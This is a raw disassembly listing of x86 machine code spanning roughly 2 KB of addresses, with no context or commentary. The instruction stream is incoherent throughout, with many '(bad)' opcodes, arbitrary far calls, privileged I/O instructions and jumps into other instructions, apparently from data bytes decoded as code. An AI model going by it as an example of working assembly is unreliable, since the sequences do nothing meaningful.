  420494:	mov    dl,0x83
  420496:	es add al,0x19
  420499:	jl     0x420450
  42049b:	sbb    BYTE PTR [ecx],0x61
  42049e:	sub    al,0xc5
  4204a0:	(bad)  
  4204a1:	test   al,0x14
  4204a3:	dec    ebp
  4204a4:	mov    ?,WORD PTR [ebx+0x57]
  4204a7:	retf   
  4204a8:	mov    edi,0x69bf12d6
  4204ad:	call   0x3fbb:0xd9fa9461
  4204b4:	inc    ecx
  4204b5:	call   FWORD PTR [eax+0x6ba23a0c]
  4204bb:	cmp    eax,0x23bb295f
  4204c0:	push   esp
  4204c1:	jmp    0x2e9aa93
  4204c6:	mov    dl,0x8a
  4204c8:	mov    bl,BYTE PTR [edi-0x16249d57]
  4204ce:	inc    edi
  4204cf:	and    al,0x55
  4204d1:	test   BYTE PTR [edi],ah
  4204d3:	fs and al,0xad
  4204d6:	sub    edi,ecx
  4204d8:	scas   al,BYTE PTR es:[edi]
  4204d9:	ss iret 
  4204db:	inc    edi
  4204dc:	fwait
  4204dd:	dec    edi
  4204de:	mov    bh,ch
  4204e0:	mov    edi,0x796683f6
  4204e5:	adc    bl,cl
  4204e7:	jmp    0x94f9:0x6cc2ad0e
  4204ee:	mov    ?,WORD PTR [eax+0x4b203eec]
  4204f4:	add    eax,ebx
  4204f6:	sahf   
  4204f7:	sub    eax,0xb233ccad
  4204fc:	call   0xaa005ea5
  420501:	adc    esp,ecx
  420503:	or     al,0x66
  420505:	hlt    
  420506:	rol    DWORD PTR [esi+0x45],1
  420509:	ret    
  42050a:	sar    DWORD PTR [edi-0xec8aeab],0x5
  420511:	ins    DWORD PTR es:[edi],dx
  420512:	jbe    0x420514
  420514:	mov    cl,0x5a
  420516:	inc    esi
  420517:	inc    eax
  420518:	inc    eax
  420519:	scas   al,BYTE PTR es:[edi]
  42051a:	cli    
  42051b:	jo     0x4204ab
  42051d:	adc    esi,DWORD PTR [ecx+eax*1-0x6b930a03]
  420524:	add    eax,0x9f0fe7ac
  420529:	jmp    0x2a10:0x503005cd
  420530:	dec    edx
  420531:	pop    ss
  420532:	sahf   
  420533:	adc    dh,BYTE PTR [ebp-0x60afabdc]
  420539:	mov    eax,DWORD PTR [edx-0x43a0fde0]
  42053f:	(bad)
  420542:	call   0x53d3:0xe8f77591
  420549:	imul   esi,DWORD PTR [esi+0x50e52516],0x2b
  420550:	mov    ds:0xf5f275c1,eax
  420555:	aad    0x46
  420557:	jae    0x42053b
  420559:	cmp    eax,DWORD PTR [ebx]
  42055b:	sbb    dh,BYTE PTR [eax+eiz*4]
  42055e:	xchg   esi,eax
  42055f:	or     eax,0x459e4d2f
  420564:	sub    ebx,DWORD PTR [esp+ecx*4]
  420567:	call   0x9da:0x923d4695
  42056e:	jl     0x420528
  420570:	daa    
  420571:	cmp    ch,ah
  420573:	sar    ch,1
  420575:	or     eax,0x289ac82a
  42057a:	mov    bh,0xa0
  42057c:	lahf   
  42057d:	xchg   edi,eax
  42057e:	mov    ah,0x25
  420580:	sahf   
  420581:	or     DWORD PTR [ecx],eax
  420583:	sub    BYTE PTR [ebp+0x2111202a],dl
  420589:	sbb    esi,DWORD PTR [edx-0x24da5ffa]
  42058f:	lds    ebx,FWORD PTR [edi+0x4dfd919d]
  420595:	pusha  
  420596:	mov    ebp,edx
  420598:	sub    BYTE PTR [ecx+0x55],al
  42059b:	sbb    ch,BYTE PTR [esi-0x747e664c]
  4205a1:	fild   DWORD PTR [esi]
  4205a3:	push   0x30
  4205a5:	adc    ebp,DWORD PTR [edi-0x80]
  4205a8:	pop    esi
  4205a9:	jae    0x4205ec
  4205ab:	test   eax,0x105e4b4e
  4205b0:	push   ebx
  4205b1:	mov    ds:0x8c55818c,al
  4205b6:	jno    0x4205d3
  4205b8:	mov    edx,0xa777df26
  4205bd:	sub    bl,dl
  4205bf:	mov    esi,0x795eaa57
  4205c4:	xchg   ebp,eax
  4205c5:	jle    0x42060e
  4205c7:	mov    edx,0xf8f68074
  4205cc:	std    
  4205cd:	xor    dl,ch
  4205cf:	div    ebx
  4205d1:	pop    eax
  4205d2:	cmp    BYTE PTR [edx-0x3e912017],dl
  4205d8:	jb     0x420603
  4205da:	fisubr DWORD PTR [ecx-0x3ffe8e24]
  4205e0:	lock test DWORD PTR [eax],ecx
  4205e3:	mov    DWORD PTR [ebp+0x63053f8e],edx
  4205e9:	add    BYTE PTR [edi-0x1a],dh
  4205ec:	push   edi
  4205ed:	cwde   
  4205ee:	ret    
  4205ef:	or     BYTE PTR [edi+0x4e],ah
  4205f2:	and    BYTE PTR ds:0x3391f6d3,ch
  4205f8:	push   eax
  4205f9:	pop    ss
  4205fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205fb:	dec    ecx
  4205fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205fd:	xchg   esi,eax
  4205fe:	outs   dx,DWORD PTR ds:[esi]
  4205ff:	pop    esp
  420600:	push   ss
  420601:	sub    BYTE PTR ds:0xbca32371,ah
  420607:	cmp    BYTE PTR [edx+edi*8-0x12],ch
  42060b:	cli    
  42060c:	dec    BYTE PTR [edx+0x4d]
  42060f:	or     eax,0x72c39716
  420614:	loop   0x420639
  420616:	sub    eax,0x5d4ff648
  42061b:	in     al,dx
  42061c:	das    
  42061d:	aaa    
  42061e:	dec    esi
  42061f:	fmul   QWORD PTR [edx+ebp*4-0x771f9ba]
  420627:	xor    BYTE PTR gs:[ebx+0x1802525a],bh
  42062e:	xchg   ebx,eax
  42062f:	mov    esi,0x9f8cee55
  420634:	sti    
  420635:	loopne 0x420632
  420637:	cmc    
  420638:	leave  
  420639:	ds mov dh,0x84
  42063c:	je     0x420640
  42063e:	scas   eax,DWORD PTR es:[edi]
  42063f:	ja     0x4205d7
  420641:	(bad)  
  420642:	lea    ecx,ds:[ebx]
  420645:	mov    edi,cs
  420647:	dec    DWORD PTR [edx+0x59]
  42064a:	clc    
  42064b:	inc    eax
  42064c:	jecxz  0x4206af
  42064e:	adc    al,0x22
  420650:	mov    ds:0xc5200f56,eax
  420655:	push   0x24
  420657:	icebp  
  420658:	jb     0x42065a
  42065a:	fld    TBYTE PTR [ecx]
  42065c:	test   esi,esi
  42065e:	xor    bl,0x8b
  420661:	int    0xfa
  420663:	or     al,0x5e
  420665:	lahf   
  420666:	scas   al,BYTE PTR es:[edi]
  420667:	jmp    0x420670
  420669:	jne    0x4206c2
  42066b:	push   cs
  42066c:	push   0x5a3bf1db
  420671:	imul   ebx,esp,0x16
  420674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420675:	into   
  420676:	xchg   ebp,eax
  420677:	and    BYTE PTR [ebx+0x3a284dfb],ch
  42067d:	out    dx,eax
  42067e:	aas    
  42067f:	push   es
  420680:	push   0xfffffff5
  420682:	sahf   
  420683:	or     eax,0xc37ea1a5
  420688:	(bad)  
  420689:	fisubr WORD PTR [ecx+0x75]
  42068c:	aad    0x50
  42068e:	mov    ds:0x7839737d,al
  420693:	push   ebx
  420694:	dec    edx
  420695:	mov    ah,0xc6
  420697:	cmp    esp,edi
  420699:	mov    ch,0xc9
  42069c:	add    DWORD PTR [ecx+0x2a],ebx
  42069f:	(bad)  
  4206a0:	popf   
  4206a1:	lea    esp,[eax+0x1b]
  4206a4:	mov    eax,ds:0x81290187
  4206a9:	jg     0x420637
  4206ab:	and    BYTE PTR [ebx-0x57d9a508],ch
  4206b1:	add    dh,BYTE PTR [edx+0x2c]
  4206b4:	inc    ecx
  4206b5:	(bad)  
  4206b6:	leave  
  4206b7:	cmp    al,0xd0
  4206b9:	dec    eax
  4206ba:	pop    ebp
  4206bb:	ficom  DWORD PTR [ebp-0x120f00ac]
  4206c1:	outs   dx,BYTE PTR ds:[esi]
  4206c2:	out    dx,al
  4206c3:	sbb    DWORD PTR [ebx+esi*1-0x4f],0x4fe0da15
  4206cb:	(bad)  
  4206cc:	push   ebp
  4206cd:	ja     0x4206ed
  4206cf:	imul   ebx,DWORD PTR [edx-0xd1a3b2],0x6557e4f2
  4206d9:	dec    esi
  4206da:	adc    BYTE PTR [ebp-0x45c60b5],ah
  4206e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206e1:	stos   BYTE PTR es:[edi],al
  4206e2:	stos   DWORD PTR es:[edi],eax
  4206e3:	cmp    bh,al
  4206e5:	mov    bl,0xd4
  4206e7:	xchg   edx,eax
  4206e8:	pop    esi
  4206e9:	fmul   DWORD PTR [ebp+0x3d]
  4206ec:	cmp    bh,BYTE PTR [ecx+0x14]
  4206ef:	out    dx,eax
  4206f0:	and    cl,BYTE PTR [ebp+ebx*8-0x190942e]
  4206f7:	mov    ch,0xb0
  4206f9:	arpl   WORD PTR [edi],ax
  4206fb:	or     ebp,eax
  4206fd:	cmp    DWORD PTR [edx-0x7f],eax
  420700:	lds    esi,FWORD PTR [esi]
  420702:	push   0xdf0d6187
  420707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420708:	shl    DWORD PTR [ecx+edi*2+0x5e],0x66
  42070d:	cli    
  42070e:	pushf  
  42070f:	sub    ebp,DWORD PTR [edx+eax*4]
  420712:	jno    0x420745
  420714:	popf   
  420715:	ins    BYTE PTR es:[edi],dx
  420716:	cmp    esp,edx
  420718:	sbb    ch,BYTE PTR [ebp-0x26258334]
  42071e:	and    ebp,DWORD PTR [ecx]
  420720:	push   0xd46120e4
  420725:	xchg   ebp,eax
  420726:	mov    ebx,DWORD PTR [ebx+0x336529de]
  42072c:	inc    eax
  42072d:	ins    BYTE PTR es:[edi],dx
  42072e:	mov    edi,0xc1e1b095
  420733:	fcom   QWORD PTR [edi]
  420735:	mov    al,BYTE PTR [esi+0x52]
  420738:	mov    ecx,DWORD PTR ss:[ebx+0x31]
  42073c:	call   0x1f50:0x1a49f98d
  420743:	jb     0x420769
  420745:	cwde   
  420746:	lods   eax,DWORD PTR ds:[esi]
  420747:	sbb    eax,0x937a86f7
  42074c:	fwait
  42074d:	cli    
  42074e:	call   0x103a2083
  420753:	test   DWORD PTR [edx-0x55],0x44ef1495
  42075a:	daa    
  42075b:	in     eax,dx
  42075c:	mov    ebp,0xa494c11c
  420761:	lea    edx,ds:0x8009a3cc
  420767:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420768:	cmp    edx,DWORD PTR [edi+0x49]
  42076b:	cld    
  42076c:	dec    ebx
  42076d:	outs   dx,BYTE PTR ds:[esi]
  42076e:	(bad)  
  42076f:	cmp    eax,0x296231b8
  420774:	in     eax,dx
  420775:	ret    
  420776:	push   0xffffffef
  420778:	gs sbb dh,ah
  42077b:	cwde   
  42077c:	iret   
  42077d:	das    
  42077e:	push   ds
  42077f:	pop    ss
  420780:	mov    dl,0xb2
  420782:	popf   
  420783:	mov    eax,0x7697aa5f
  420788:	(bad)  
  420789:	push   ecx
  42078a:	and    ch,BYTE PTR [bx+0x28]
  42078e:	xchg   esp,eax
  42078f:	jmp    0xea36:0x2fea51e0
  420796:	outs   dx,DWORD PTR ds:[esi]
  420797:	xor    dh,ch
  420799:	mov    dl,0x52
  42079b:	scas   al,BYTE PTR es:[edi]
  42079c:	adc    al,0x27
  42079e:	arpl   WORD PTR [ebx],bx
  4207a0:	aad    0xc2
  4207a2:	out    0xc0,al
  4207a4:	pop    edx
  4207a5:	scas   al,BYTE PTR es:[edi]
  4207a6:	mov    BYTE PTR ds:0x4233ba13,dl
  4207ac:	jbe    0x4207fe
  4207ae:	sub    dl,BYTE PTR [ebx-0x11204ca4]
  4207b4:	mov    ss,WORD PTR [esp+edx*8+0x0]
  4207b8:	add    esp,DWORD PTR [ebx+0x9]
  4207bb:	sti    
  4207bc:	test   ebx,eax
  4207be:	mov    esi,0xc89e276d
  4207c3:	pop    ebp
  4207c4:	(bad)  
  4207c5:	jg     0x4207b4
  4207c7:	ret    0xa7d2
  4207ca:	inc    edx
  4207cb:	inc    edi
  4207cc:	test   DWORD PTR [eax-0x409e0217],edx
  4207d2:	outs   dx,BYTE PTR ds:[esi]
  4207d3:	push   ds
  4207d4:	mov    esi,0x1926e5c8
  4207d9:	push   ds
  4207da:	leave  
  4207db:	imul   esi,DWORD PTR [ebx+0x4c],0x6f
  4207df:	cli    
  4207e0:	aaa    
  4207e1:	bound  ecx,QWORD PTR [ecx+0x7f]
  4207e4:	add    BYTE PTR [edi-0x4ab4d07c],bl
  4207ea:	outs   dx,DWORD PTR ds:[esi]
  4207eb:	fimul  DWORD PTR [ebx-0x75d5a5c0]
  4207f1:	data16 mov bl,0xdb
  4207f4:	add    BYTE PTR [edi],al
  4207f6:	jno    0x420850
  4207f8:	aam    0x83
  4207fa:	ror    DWORD PTR [ecx-0x3f],0x78
  4207fe:	(bad)  
  4207ff:	in     al,dx
  420800:	jmp    0x4207cd
  420802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420803:	rol    eax,1
  420805:	push   eax
  420806:	inc    ebp
  420807:	repz mov ds:0xb68e1520,eax
  42080d:	in     al,dx
  42080e:	shl    DWORD PTR [edx],cl
  420810:	std    
  420811:	adc    BYTE PTR ss:[eax-0x7ef02416],bl
  420818:	mov    cl,0xef
  42081a:	aad    0x78
  42081c:	retf   0xb30e
  42081f:	ja     0x42083e
  420821:	popa   
  420822:	mov    eax,ds:0xb840665c
  420827:	xlat   BYTE PTR ds:[ebx]
  420828:	aaa    
  420829:	cmp    dl,ah
  42082b:	scas   al,BYTE PTR es:[edi]
  42082c:	cld    
  42082d:	sbb    al,0x7c
  42082f:	or     eax,0x3c84c71c
  420834:	jno    0x4207f5
  420836:	popf   
  420837:	push   ebp
  420838:	out    0xfc,al
  42083a:	mov    eax,0x79a53853
  42083f:	dec    ebp
  420840:	mov    al,ds:0xd8b0f673
  420845:	retf   
  420846:	mov    edx,0xf5addb26
  42084b:	out    dx,eax
  42084c:	int3   
  42084d:	xor    DWORD PTR [ecx+0x0],0x4a
  420851:	test   eax,0xf99f18e7
  420856:	std    
  420857:	mov    al,ds:0x21b435eb
  42085c:	mov    ah,0x19
  42085e:	add    al,0x8
  420860:	loop   0x420842
  420862:	mov    DWORD PTR [ebx],esp
  420864:	add    al,0x93
  420866:	mov    ebx,0xd70097a0
  42086b:	mov    cl,0x92
  42086d:	and    al,BYTE PTR [ebx-0x68]
  420870:	fs ss out dx,eax
  420873:	jmp    FWORD PTR [esi-0x74]
  420876:	xor    al,al
  420878:	loopne 0x420897
  42087a:	loope  0x420829
  42087c:	or     DWORD PTR [ebx],esp
  42087e:	pop    ebp
  42087f:	add    bh,ah
  420881:	stos   BYTE PTR es:[edi],al
  420882:	adc    ah,BYTE PTR [eax-0x3b614102]
  420888:	pop    ss
  420889:	aad    0xd7
  42088b:	jmp    0xdb949772
  420890:	call   0x9e9006e6
  420895:	jp     0x4208b8
  420897:	push   0x2e3a338e
  42089c:	jnp    0x4208b2
  42089e:	pop    ss
  42089f:	jae    0x420909
  4208a1:	inc    eax
  4208a2:	adc    eax,0x8430a0c5
  4208a7:	scas   al,BYTE PTR es:[edi]
  4208a8:	(bad)  
  4208a9:	adc    ebp,ecx
  4208ab:	mov    al,0x87
  4208ad:	test   DWORD PTR [eax+0x2b],ebp
  4208b0:	ds cdq 
  4208b2:	push   esp
  4208b3:	fiadd  WORD PTR [ecx]
  4208b5:	dec    ecx
  4208b6:	mov    ecx,es
  4208b8:	mov    ah,0xd0
  4208ba:	repnz ins DWORD PTR es:[edi],dx
  4208bc:	fst    QWORD PTR [ebx+ecx*8]
  4208bf:	hlt    
  4208c0:	mov    esi,0xf1ac3640
  4208c5:	and    DWORD PTR [esi+esi*2-0x75fd818],esi
  4208cc:	and    DWORD PTR [ebp+0x54],edi
  4208cf:	adc    dl,BYTE PTR [esi+0xe8b7627]
  4208d5:	add    DWORD PTR fs:[ebp-0x2f],ebp
  4208d9:	ror    ebx,cl
  4208db:	xor    bl,BYTE PTR [ebx]
  4208dd:	push   ss
  4208de:	fisttp DWORD PTR [eax]
  4208e0:	xor    eax,0x62f01a38
  4208e5:	mov    esp,0xbece4bf9
  4208ea:	adc    DWORD PTR [ebx+0x2a],esi
  4208ed:	jp     0x420949
  4208ef:	jmp    0x5f8575d3
  4208f4:	push   ss
  4208f5:	adc    al,0x22
  4208f7:	mov    al,ds:0xa4b8a7f8
  4208fc:	xor    DWORD PTR [esi+ebx*1],0xffffffb1
  420900:	lock rol DWORD PTR ds:0x31623f14,cl
  420907:	adc    esi,DWORD PTR [ebx+0x590d4dd1]
  42090d:	push   esi
  42090e:	adc    BYTE PTR [edx+ebx*2],al
  420911:	and    DWORD PTR [edi+0x7a223c77],0xe67e2138
  42091b:	fldln2 
  42091d:	xchg   ecx,eax
  42091e:	out    0x39,eax
  420920:	mov    esp,0x340ccb00
  420925:	ds push edx
  420927:	cmp    BYTE PTR [ecx],al
  420929:	(bad)  
  42092a:	xlat   BYTE PTR ds:[ebx]
  42092b:	lods   eax,DWORD PTR ds:[esi]
  42092c:	push   es
  42092d:	xchg   ebp,eax
  42092e:	adc    eax,0xd5e15458
  420933:	inc    edi
  420934:	in     eax,dx
  420935:	mov    cs,WORD PTR [edi+0x1d]
  420938:	and    ah,bl
  42093a:	mov    WORD PTR [esi+0x76],fs
  42093d:	or     BYTE PTR fs:[esi],al
  420940:	and    edx,ebx
  420942:	popf   
  420943:	pop    esp
  420944:	stc    
  420945:	pop    ebp
  420946:	push   edi
  420947:	inc    ebx
  420948:	sbb    DWORD PTR ds:0x577477e9,ecx
  42094e:	push   edi
  42094f:	sub    eax,0xd6b3697b
  420954:	outs   dx,BYTE PTR ds:[esi]
  420955:	sbb    dh,BYTE PTR [edx+0x73]
  420958:	push   esi
  420959:	push   ebx
  42095a:	daa    
  42095b:	pusha  
  42095c:	mov    dl,0x4
  42095f:	inc    esp
  420960:	add    BYTE PTR [ebx+0x2d],cl
  420963:	xor    DWORD PTR [ecx],edi
  420965:	scas   al,BYTE PTR es:[edi]
  420966:	div    BYTE PTR fs:[ebx-0x1d]
  42096a:	add    esp,DWORD PTR [ebp-0x31a9a000]
  420970:	loop   0x420957
  420972:	and    BYTE PTR [ebx],bl
  420974:	call   0x698f999e
  420979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42097a:	lea    edi,[ebp+0x60465d2a]
  420980:	cwde   
  420981:	dec    sp
  420983:	adc    al,0x99
  420985:	or     eax,0xee8f2fc9
  42098a:	into   
  42098b:	jmp    0x4209ba
  42098d:	call   0x5d54:0x1be479a6
  420994:	sti    
  420995:	pop    ecx
  420996:	or     al,0xc4
  420998:	lods   eax,DWORD PTR ds:[esi]
  420999:	push   ecx
  42099a:	add    DWORD PTR [ebp+0x314cea5e],edi
  4209a0:	icebp  
  4209a1:	mov    ah,0x9
  4209a3:	xchg   esi,eax
  4209a4:	jmp    DWORD PTR [ebp-0x54]
  4209a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209a8:	mov    ch,0x5d
  4209aa:	retf   
  4209ab:	lds    eax,FWORD PTR [ebp-0x7cd8d5e7]
  4209b1:	gs push ebp
  4209b3:	inc    esi
  4209b4:	inc    edi
  4209b5:	js     0x4209fd
  4209b7:	jl     0x420a06
  4209b9:	nop
  4209ba:	pop    eax
  4209bb:	loop   0x42099b
  4209bd:	mov    esp,0xcac2b6ec
  4209c3:	in     eax,0xa1
  4209c5:	mov    ch,0x2a
  4209c7:	leave  
  4209c8:	jmp    0x959e2284
  4209cd:	ficomp WORD PTR [eax]
  4209cf:	jo     0x42096a
  4209d1:	mov    edx,0x9a7d5418
  4209d6:	mov    ecx,0xf22de820
  4209db:	add    BYTE PTR [edi],ah
  4209dd:	jge    0x4209f1
  4209df:	das    
  4209e0:	xchg   ebx,eax
  4209e1:	xchg   edx,eax
  4209e2:	or     eax,0x8cdda52d
  4209e7:	popa   
  4209e8:	in     al,0xf0
  4209ea:	aad    0xb5
  4209ec:	xchg   esp,eax
  4209ed:	imul   ebp,eax,0xd008d820
  4209f3:	lock and BYTE PTR [edi-0x7521a7a3],ah
  4209fa:	add    eax,0xbef3065a
  4209ff:	push   esi
  420a00:	jb     0x420a44
  420a02:	add    BYTE PTR [edx+0x2f],cl
  420a05:	js     0x4209bd
  420a07:	fistp  QWORD PTR [ecx+0x296cac3f]
  420a0d:	test   DWORD PTR [ecx],esp
  420a0f:	pop    esp
  420a10:	inc    eax
  420a11:	jle    0x4209f7
  420a13:	jmp    0x4209e4
  420a15:	sbb    cl,BYTE PTR [edx]
  420a17:	mov    ebp,0x2bc4f02d
  420a1c:	std    
  420a1d:	push   ebp
  420a1e:	fisubr WORD PTR ss:[edx-0x2e4ec52]
  420a25:	aad    0x8b
  420a27:	outs   dx,DWORD PTR ds:[esi]
  420a28:	add    bh,bh
  420a2a:	adc    eax,0xcd282090
  420a2f:	jmp    0x420a72
  420a31:	jle    0x420a87
  420a33:	xor    BYTE PTR [ecx],dl
  420a35:	arpl   WORD PTR [eax+0x6b],bx
  420a38:	lods   eax,DWORD PTR ds:[esi]
  420a39:	mov    esp,cs
  420a3b:	iret   
  420a3c:	int    0x6d
  420a3e:	icebp  
  420a3f:	pop    es
  420a40:	lods   al,BYTE PTR ds:[esi]
  420a41:	int    0xd3
  420a43:	cmp    esi,DWORD PTR [ecx]
  420a45:	pop    edi
  420a46:	sar    DWORD PTR [ebx+0x34],cl
  420a49:	dec    esp
  420a4a:	ds dec eax
  420a4c:	pop    es
  420a4d:	pop    ecx
  420a4e:	fld    TBYTE PTR [ebp+0x65]
  420a52:	jno    0x420a67
  420a54:	mov    ds:0x87bb251a,eax
  420a59:	(bad)  
  420a5a:	iret   
  420a5b:	xchg   edx,eax
  420a5c:	and    eax,0x7c8a2f6c
  420a61:	test   DWORD PTR [edx-0x1218b7d3],0xa138a679
  420a6b:	push   ecx
  420a6c:	dec    eax
  420a6d:	loopne 0x420a31
  420a6f:	xchg   ebx,eax
  420a70:	jg     0x4209fb
  420a72:	jle    0x420a39
  420a74:	fnstenv [ecx+esi*8]
  420a77:	fbld   TBYTE PTR [eax+0x1e9b5186]
  420a7d:	fcmove st,st(5)
  420a7f:	retf   0xe7ee
  420a82:	call   0xd146:0x6f66a67b
  420a89:	repnz cmp DWORD PTR [ebx-0x16399b0b],edi
  420a90:	mov    WORD PTR [edx-0x2a],es
  420a93:	adc    eax,esp
  420a95:	mov    al,0xec
  420a97:	ss sbb dh,bh
  420a9a:	cmp    ebp,ecx
  420a9c:	or     al,0x13
  420a9e:	inc    ebp
  420a9f:	mov    DWORD PTR [edx-0x61],ebp
  420aa2:	test   DWORD PTR [edx+ecx*2],ebp
  420aa5:	mov    bh,0xb5
  420aa7:	push   esi
  420aa8:	aas    
  420aa9:	loopne 0x420aa7
  420aab:	mov    fs,WORD PTR [edx-0x29]
  420aae:	repnz mov bl,0xf7
  420ab1:	loopne 0x420a58
  420ab3:	(bad)  
  420ab4:	adc    edx,DWORD PTR ds:0xd6fea94d
  420aba:	retf   0xfe98
  420abd:	daa    
  420abe:	sub    ah,BYTE PTR [ebp-0x7d]
  420ac1:	ror    ecx,0x86
  420ac4:	mov    ds:0xbdae9c71,al
  420ac9:	sub    al,0x5a
  420acb:	push   ebx
  420acc:	and    ch,BYTE PTR [edi+0x5d087523]
  420ad2:	jmp    0x420a62
  420ad4:	jmp    0x796c:0xd1c226f1
  420adb:	das    
  420adc:	sar    BYTE PTR [edi+0x2a],cl
  420adf:	pop    ecx
  420ae0:	xchg   ebp,eax
  420ae1:	inc    ebx
  420ae2:	ins    BYTE PTR es:[edi],dx
  420ae3:	das    
  420ae4:	lds    esi,FWORD PTR [edx+0x28]
  420ae7:	dec    edi
  420ae8:	cdq    
  420ae9:	and    eax,0xc3ee2677
  420aee:	mov    cl,0xd2
  420af0:	sub    al,0xad
  420af2:	push   ds
  420af3:	ds mov dh,0x91
  420af6:	adc    al,0xe7
  420af8:	jge    0x420b61
  420afa:	(bad)  
  420afb:	adc    ebx,DWORD PTR [ebx+ebp*8+0x2aa9abd6]
  420b02:	imul   ebp,DWORD PTR [esi],0x22
  420b05:	lock push ebp
  420b07:	popf   
  420b08:	adc    BYTE PTR [esi+0x77b03c5a],0x1f
  420b0f:	cmp    ebx,edx
  420b11:	pop    ecx
  420b12:	data16 stos BYTE PTR es:[edi],al
  420b14:	bnd jle 0x420add
  420b17:	sbb    cl,BYTE PTR [eax-0x568d00fc]
  420b1d:	inc    edi
  420b1e:	mov    esi,0x467e5fec
  420b23:	popf   
  420b24:	push   eax
  420b25:	outs   dx,BYTE PTR ds:[esi]
  420b26:	cmp    al,BYTE PTR [edi+0x75]
  420b29:	mov    al,ds:0x8c1462f4
  420b2e:	xor    edx,esi
  420b30:	sub    esp,DWORD PTR [edx+0x41a82f35]
  420b36:	adc    eax,DWORD PTR [esi-0x3a]
  420b39:	dec    eax
  420b3a:	adc    edx,eax
  420b3c:	pop    esp
  420b3d:	mov    dh,0xe3
  420b3f:	cld    
  420b40:	dec    ch
  420b42:	add    DWORD PTR [edi],ebp
  420b44:	(bad)  
  420b45:	jmp    0xc36425c1
  420b4a:	or     eax,0x706616a2
  420b4f:	xchg   edx,eax
  420b50:	mov    ah,0xf4
  420b52:	jno    0x420b9a
  420b54:	add    eax,DWORD PTR [ebx-0x51b25eb0]
  420b5a:	icebp  
  420b5b:	jge    0x420af9
  420b5d:	lock xchg esi,eax
  420b5f:	sub    al,0xc8
  420b61:	loopne 0x420af6
  420b63:	xchg   ecx,eax
  420b64:	pop    edi
  420b65:	add    bh,BYTE PTR [esi+0x4edc3529]
  420b6b:	retf   0x2202
  420b6e:	mov    BYTE PTR [edi-0x35],dh
  420b71:	mov    edx,0x294efd60
  420b76:	test   al,0xec
  420b78:	lods   al,BYTE PTR ds:[esi]
  420b79:	clc    
  420b7a:	fchs   
  420b7c:	sbb    eax,0x75fecf5d
  420b81:	jb     0x420b4c
  420b83:	lods   al,BYTE PTR ds:[esi]
  420b84:	test   ch,bl
  420b86:	ds ror DWORD PTR ds:[esi],0x59
  420b8b:	call   0xd34d:0xeea9a9df
  420b92:	shl    BYTE PTR [edi+0x63],1
  420b95:	dec    ebp
  420b96:	push   bx
  420b98:	(bad)  
  420b9a:	(bad)  
  420b9b:	(bad)  
  420b9c:	mov    ch,BYTE PTR [edx+edx*8+0x4d]
  420ba0:	and    BYTE PTR [edi+0x7b2815f1],ch
  420ba6:	sbb    dh,dl
  420ba8:	mov    al,BYTE PTR [edx+0x0]
  420bab:	cmc    
  420bac:	pop    edi
  420bad:	retf   
  420bae:	fld    QWORD PTR ds:0x54b10d12
  420bb4:	and    DWORD PTR [esi+0x67d36ac1],edi
  420bba:	sbb    ah,BYTE PTR [eax-0x5f]
  420bbd:	mov    DWORD PTR [ebp+0x47],0x856c0a2
  420bc4:	inc    ebx
  420bc5:	int3   
  420bc6:	ins    DWORD PTR es:[edi],dx
  420bc7:	daa    
  420bc8:	es mov dh,0x9
  420bcb:	fs ret 
  420bcd:	fwait
  420bce:	mov    bh,0xa9
  420bd0:	inc    eax
  420bd1:	mov    ebx,0x3e69222d
  420bd6:	jnp    0x420c4a
  420bd8:	dec    eax
  420bd9:	push   0x2d95daf6
  420bde:	add    BYTE PTR [edx+0x4def2a06],ah
  420be4:	cwde   
  420be5:	imul   esp,ebx,0x9e3bd170
  420beb:	jmp    0x9be2:0x4565317d
  420bf2:	push   eax
  420bf3:	or     esp,eax
  420bf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bf6:	sahf   
  420bf7:	pop    eax
  420bf8:	mov    ebx,0x1a3121d4
  420bfd:	loop   0x420c7a
  420bff:	enter  0xed58,0x8e
  420c03:	fidivr WORD PTR [ebx]
  420c05:	jmp    0x70a7:0xdb155a2a
  420c0c:	enter  0xc5f1,0x6
  420c10:	in     eax,0x47
  420c12:	inc    esi
  420c13:	mov    edi,0x3386a619
  420c18:	test   al,0x8f
  420c1a:	call   0x1a2d:0x7ff8177f
  420c21:	xchg   esp,eax
  420c22:	jg     0x420ba4
  420c24:	loop   0x420c8d
  420c26:	xlat   BYTE PTR ds:[ebx]
  420c27:	shr    DWORD PTR [esi-0x17e4a1e4],1
  420c2d:	cwde   
  420c2e:	mov    esp,0xdbe98d2c
  420c33:	push   ebx
  420c34:	leave  
  420c35:	mov    bh,0x22
  420c37:	cmp    al,0x68
  420c39:	adc    esp,DWORD PTR [ebp-0x3a]
  420c3c:	cmc    
  420c3d:	ror    DWORD PTR [ebx],0xef
  420c40:	mov    edi,0x141e28d6
  420c45:	dec    ebp
  420c46:	cs adc al,0x26
  420c49:	ret    0xd551
  420c4c:	sub    eax,0xfdeff834
  420c51:	sti    
  420c52:	mov    esp,0xae29c31d
  420c57:	add    BYTE PTR [edx+0x78940d17],al
  420c5d:	push   eax
  420c5e:	mov    ebp,esp
  420c60:	xor    DWORD PTR [eax],ecx
  420c62:	call   0x6eb:0xec4edbf6
  420c69:	std    
  420c6a:	ins    DWORD PTR es:[edi],dx
  420c6b:	mov    bh,0x58
  420c6d:	add    BYTE PTR [ebx],0x19
  420c70:	imul   esp,DWORD PTR [esi+0x45],0xffffffff
  420c74:	outs   dx,DWORD PTR ds:[esi]
  420c75:	out    0xac,eax
  420c77:	xchg   ebp,eax
  420c78:	fisubr DWORD PTR [esi-0x2fd42a69]
  420c7e:	and    DWORD PTR [ecx+eiz*2],ebx
  420c81:	dec    esp
  420c82:	pusha  
  420c83:	popw   ss
  420c85:	xor    cl,BYTE PTR [eax+0x41dabe60]
  420c8b:	xor    dh,bl
  420c8d:	gs in  al,dx
  420c8f:	xchg   DWORD PTR [ecx-0x18],ebx
  420c92:	call   0x45d9:0x8ab30559
  420c99:	sbb    DWORD PTR [edi],ebx
  420c9b:	call   0x8eda81f4
